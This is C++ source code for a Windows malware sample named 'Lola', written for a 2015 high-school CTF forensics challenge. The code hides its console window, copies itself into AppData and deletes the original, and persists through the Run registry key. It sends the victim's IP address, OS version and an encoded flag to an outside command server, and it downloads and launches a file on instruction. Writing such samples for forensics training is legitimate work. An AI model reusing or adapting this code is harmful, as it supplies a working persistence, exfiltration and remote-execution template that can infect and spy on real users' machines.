/*
 * Lola Malware
 *
 * Nick Anderson - 2015
 *
 * This malware was written for the 2015 CSAW High School forensics challenge.
 *
 *  
 */

#include <sstream>
#include <iostream>
#include <stdio.h>
#include <string>
#include <stdlib.h>
#include <Shlwapi.h>
#include <ShlObj.h>
#include <urlmon.h>
#include <WinInet.h>
#include <shellapi.h>

using namespace std;

#define OS_VERSION_BUFFER_SIZE 100
#define MAX_URI_BUFFER_SIZE 255
#define FLAG_LENGTH 35
#define IP_BUFFER_SIZE 40
#define XOR_KEY 0x42
#define MAX_C2_BUFF_SIZE 0x500

/* The flag is: flag_{l0la_w4nts_t0_n0m_y3r_warez} */
// Flag encrypted with the XOR key, 0x42
BYTE FLAG[] = {"\x24\x2e\x23\x25\x1d\x39\x2e\x72\x2e\x23\x1d\x35\x76\x2c\x36\x31\x1d\x36\x72\x1d\x2c\x72\x2f\x1d\x3b\x71\x30\x1d\x35\x23\x30\x27\x38\x3f\x0"};
char IP[IP_BUFFER_SIZE];
wchar_t* ROAMINGAPPDATAEXEC = new wchar_t[MAX_PATH];
wchar_t* ROAMINGAPPDATAPATH = new wchar_t[MAX_PATH];
const LPCSTR C2DOM = "https://www.socialmalware.io/static/hsf/L0la.jpg";
char* CFG_URI = "https://www.socialmalware.io/static/hsf/cfg.dat";
char L0LA_IMG_PATH[MAX_PATH];
char C2_BUFF[MAX_C2_BUFF_SIZE];

/* Decrypt the flag blob */
void decrypt(BYTE* flag){

	for(size_t i = 0; flag[i] != 0x0; i++){
		flag[i] = flag[i] ^ XOR_KEY;
	}
}

/* This wont be used */
void encrypt(BYTE* flag){
	for(size_t i = 0; flag[i] != 0x0; i++){
		flag[i] = flag[i] ^ XOR_KEY;
	}
}

/* Grab our external IP address from canhazip.com */
void get_ip()
{
	HINTERNET hInternet, hFile;
	DWORD rsize;

	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hFile = InternetOpenUrlA(hInternet, "http://canhazip.com", NULL, 0, INTERNET_FLAG_RELOAD, 0);
	InternetReadFile(hFile, &IP, sizeof(IP), &rsize);

	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);
}

/* 
	This functions only job should be to move itself, the exe, to APPDATA
	and relaunch itself

	NOTE: We honestly don't care about return value. If the file already exists
	the CopyData function will fail, however this is the same as if we aren't
	able to write. So we don't do anything with the return value.

	Returns EXIT_FAILURE on fail
	Returns EXIT_SUCCESS on success
*/
int hide(const wchar_t* epath){
	
	int ret = 0;
	HINSTANCE sret = NULL;

	/* Set the Hidden Attribute */
	SetFileAttributes(epath,FILE_ATTRIBUTE_HIDDEN);
	
	/* Copy the file to Roaming APPDATA */
	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ROAMINGAPPDATAPATH) ) )
	{
		wstringstream wss;
		wss.clear();
		wss << ROAMINGAPPDATAPATH << L"\\lola.exe" << L'\x00';
		wstring destPath = wss.str();
		ret = CopyFile(epath, const_cast<LPWSTR>(destPath.c_str()), TRUE);

		/* Save the exe path */
		memset(ROAMINGAPPDATAEXEC, 0x0, sizeof(ROAMINGAPPDATAEXEC));
		for(size_t i = 0; i < destPath.size(); i++){
			ROAMINGAPPDATAEXEC[i] = destPath[i];
		}

		/* TODO: Delete the old file, and transfer execution to the new file.
		note that this is where the result of CopyFile might come in handy, i.e. if
		CopyFile returns FALSE, then we continue the other functionality, if it returns
		TRUE, then we exit after deleting the old file and transfering execution*/
		if(ret) /* delete the old file */
		{
			Sleep(10); // This is here to ensure that the original, spawning process has exited, before we delete.
			ret = DeleteFile(epath);
		}

		sret = ShellExecute( NULL, L"open", const_cast<LPWSTR>(destPath.c_str()), NULL, NULL, 0 );


		return EXIT_SUCCESS;
	}
	else
	{
		return EXIT_FAILURE;
	}
}

/*
 * Make Lola persist.  To do this we write a new reg key :3  Pretty obvious.
 */
int persist()
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH*2;
	wchar_t szValue[count] = {};
	memset(ROAMINGAPPDATAEXEC, 0x0, MAX_PATH);

	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, ROAMINGAPPDATAEXEC);
	wcscat_s(szValue, count, L"\" ");

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if(fSuccess) // Registry key was successfully created
	{
		dwSize = (wcslen(szValue)+1)*2;
		lResult = RegSetValueExW(hKey, L"lola", 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}
	else
	{
		cerr << "[-] Error creating registry key!" << endl;
		return EXIT_FAILURE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	if (fSuccess)
	{
		return EXIT_SUCCESS;
	}
	return EXIT_FAILURE;
}

int beacon()
{
	HRESULT hRes;
	wchar_t* szDestPath[MAX_PATH];
	memset(szDestPath, 0x0, sizeof(szDestPath));

	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, szDestPath) ) )
	{
		// Misc variables
		DWORD len;
		size_t ret;
		BOOL cryptRet;
		
		// Buffer for the encoded flag
		LPSTR flagbuff_encoded;

		// Buffers for the encoded IP address
		LPSTR ipbuff_encoded;
		BYTE IPb[IP_BUFFER_SIZE];
		
		// Buffer for the encoded OS Version information
		LPSTR os_ver_encoded;
		char ver_info[OS_VERSION_BUFFER_SIZE];
		BYTE ver_infob[OS_VERSION_BUFFER_SIZE];
		OSVERSIONINFO osvi;

		// Used to convert wide/narrow strings in Windows. Destination path for file download.
		wstringstream wss;

		// Used to get further instructions in InternetOpen
		HINTERNET hInternet, hFile;
		DWORD rsize;
		char uri[MAX_URI_BUFFER_SIZE];

		// Init buffers to null
		memset(L0LA_IMG_PATH, 0x0, sizeof(L0LA_IMG_PATH));
		memset(uri, 0x0, MAX_URI_BUFFER_SIZE);
		memset(IPb, 0x0, IP_BUFFER_SIZE);
		memset(ver_info, 0x0, OS_VERSION_BUFFER_SIZE);
		memset(ver_infob, 0x0, OS_VERSION_BUFFER_SIZE);

		/* Decrypt the flag */
		decrypt(FLAG);
		cryptRet = CryptBinaryToStringA(FLAG, FLAG_LENGTH, CRYPT_STRING_BASE64, NULL, &len);
		flagbuff_encoded = (LPSTR)malloc(len); // b64 container for the flag
		cryptRet = CryptBinaryToStringA(FLAG, FLAG_LENGTH, CRYPT_STRING_BASE64, flagbuff_encoded, &len);

		/* Get the OS Version, we'll send the major and minor values */
		GetVersionEx(&osvi);
		sprintf_s(ver_info, OS_VERSION_BUFFER_SIZE, "M:%d_m:%d_B:%d_P:%d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber, osvi.dwPlatformId);
		for(int i = 0; i < OS_VERSION_BUFFER_SIZE; i++)
			ver_infob[i] = ver_info[i];
		cryptRet = CryptBinaryToStringA(ver_infob, OS_VERSION_BUFFER_SIZE, CRYPT_STRING_BASE64, NULL, &len);
		os_ver_encoded = (LPSTR)malloc(len);
		cryptRet = CryptBinaryToStringA(ver_infob, OS_VERSION_BUFFER_SIZE, CRYPT_STRING_BASE64, os_ver_encoded, &len);

		/* Get the external IP address */
		get_ip();
		for(int i = 0; i < IP_BUFFER_SIZE; i++)
			IPb[i] = IP[i];
		cryptRet = CryptBinaryToStringA(IPb, IP_BUFFER_SIZE, CRYPT_STRING_BASE64, NULL, &len);
		ipbuff_encoded = (LPSTR)malloc(len);
		cryptRet = CryptBinaryToStringA(IPb, IP_BUFFER_SIZE, CRYPT_STRING_BASE64, ipbuff_encoded, &len);

		/* Setup the destination path for the download */
		wss << ROAMINGAPPDATAPATH << L"\\lola.jpg";
		wstring tmpDestPath = wss.str();
		memset(L0LA_IMG_PATH, 0x0, sizeof(L0LA_IMG_PATH));
		wcstombs_s(&ret, L0LA_IMG_PATH, tmpDestPath.c_str(), sizeof(L0LA_IMG_PATH));

		/* Go get C2 instructions ;3 */
		hRes = URLDownloadToFileA(NULL, C2DOM, L0LA_IMG_PATH, 0, NULL);


		/* Construct the full URI.  This will exfill the data, and get additional information*/
		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		// flag beacon: uri?ex=<b64 flag>&ip=<b64 ip>&ver=<b64 of OS info>
		sprintf_s(uri, MAX_URI_BUFFER_SIZE, "%S?ex=%S&ip=%S&ver=%S", CFG_URI, flagbuff_encoded, ipbuff_encoded, os_ver_encoded);
		hFile = InternetOpenUrlA(hInternet, uri, NULL, 0, INTERNET_FLAG_RELOAD, 0);
		InternetReadFile(hFile, &C2_BUFF, MAX_C2_BUFF_SIZE, &rsize);
		C2_BUFF[rsize] = '\x0'; // ensure that we null terminate the values read :P

		InternetCloseHandle(hFile);
		InternetCloseHandle(hInternet);

		return EXIT_SUCCESS; // Change this to the integer value read from the server.
	}

	return EXIT_FAILURE;
}


/* Main :P */
int main(int argc, char* argv[]){
	
	/* Hide the console window */
	ShowWindow( GetConsoleWindow(), SW_HIDE );

	/* locals */
	size_t c2comm = 0;
	size_t convChars = 0;
	size_t ret = 0;
	wchar_t execPath[MAX_PATH];

	memset(execPath, 0x0, sizeof(execPath));

	cout << argv[0] << endl;

	mbstowcs_s(&convChars, execPath, argv[0], MAX_PATH); // TODO: This is a bug :P

	/* Hide */

	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ROAMINGAPPDATAPATH) ) )
	{
		/* If the program is executing out of APP data, then it's likely we've already infected this host.
		Skip the Hiding process, and continue on */
		// TODO: Change this to install/check for a mutex. This is a more elegant solution to prevent reinfection
		char roaming_app_tmp[MAX_PATH];
		wcstombs_s(&ret, roaming_app_tmp, ROAMINGAPPDATAPATH, MAX_PATH);
		if(strstr(argv[0], roaming_app_tmp) == NULL)
		{
			if( hide(execPath) == EXIT_FAILURE )
			{
				/* Unable to copy exe to APPDATA */
				cerr << "[-] Unable to copy Lola to APPDATA and/or Lola already exists in APPDATA!" << endl;
				return EXIT_FAILURE;
			}
		}
	}


	/* Persist */
	if( persist() )
	{
		cerr << "[-] Lola wasn't able to persist!" << endl;
		return EXIT_FAILURE;
	}

	while(true)
	{
		/* Ask C2 what to do next */
		c2comm = beacon();
		// TODO: Wrap this in a while(true) loop that just continuously beacons

		if(c2comm == EXIT_SUCCESS)
		{
			BYTE instruction = C2_BUFF[0];

			/* TODO: Add more functionality as desired. As this is a simple CTF challenge,
			we really don't do much.  This code is left here as the template for the C2
			actions. */
			switch(instruction)
			{
			case 0x1:
				Sleep(1000); // For testing
				//Sleep(120000); // For prod
				ShellExecuteA(0, 0, L0LA_IMG_PATH, 0, 0 , SW_SHOW );
				break;

			default:
				Sleep(30000);
			}

		}
		else
		{
			Sleep(300000);
		}

		// There's currently a memory leak :P
		//delete ROAMINGAPPDATAEXEC;
		//delete ROAMINGAPPDATAPATH;
	}
	return 0;
}